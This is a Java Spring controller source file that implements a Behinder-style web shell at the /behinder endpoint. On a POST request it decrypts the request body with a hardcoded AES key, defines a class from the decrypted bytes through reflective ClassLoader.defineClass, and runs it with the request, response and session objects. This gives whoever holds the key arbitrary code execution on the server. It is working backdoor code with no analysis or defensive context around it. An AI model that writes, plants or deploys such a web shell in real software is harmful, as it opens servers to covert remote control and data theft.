package com.test;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import java.lang.reflect.Method;
import java.util.HashMap;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import sun.misc.BASE64Decoder;



@RestController
@Controller
public class Behinder {
    String k = "e45e329feb5d925b"; // rebeyond


    @RequestMapping("/behinder")
    public void test(HttpServletRequest servletRequest, HttpServletResponse servletResponse) {

        try {
            //   System.out.println("Do Filter ......");
            HttpServletRequest request = (HttpServletRequest)servletRequest;
            HttpServletResponse response = (HttpServletResponse)servletResponse;
            HttpSession session = request.getSession();
            String who = ((HttpServletRequest) servletRequest).getHeader("who");

            HashMap pageContext = new HashMap();
            pageContext.put("request", request);
            pageContext.put("response", response);
            pageContext.put("session", session);
            if (request.getMethod().equals("POST")) {
                session.putValue("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));

                Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                method.setAccessible(true);
                byte[] evilclass_byte = c.doFinal((new BASE64Decoder()).decodeBuffer(request.getReader().readLine()));
                Class evilclass = (Class)method.invoke(this.getClass().getClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                evilclass.newInstance().equals(pageContext);
            }
        } catch (Exception var13) {
            var13.printStackTrace();
        }
    }
}
